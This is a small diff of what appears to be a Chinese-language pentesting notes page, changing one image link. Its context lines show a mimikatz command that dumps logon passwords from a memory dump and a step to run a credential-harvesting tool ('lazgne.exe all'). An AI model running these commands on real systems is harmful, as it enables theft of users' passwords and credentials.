@@ -102,7 +102,7 @@ mimikatz.exe "sekurlsa::minidump debug596" "sekurlsa::logonPasswords full" "exit
 
 下载直接运行`lazgne.exe all`
 
-![](../../.gitbook/assets/image%20%28442%29.png)
+![](../../.gitbook/assets/image%20%28443%29.png)
 
 ![](../../.gitbook/assets/image%20%28433%29.png)
 
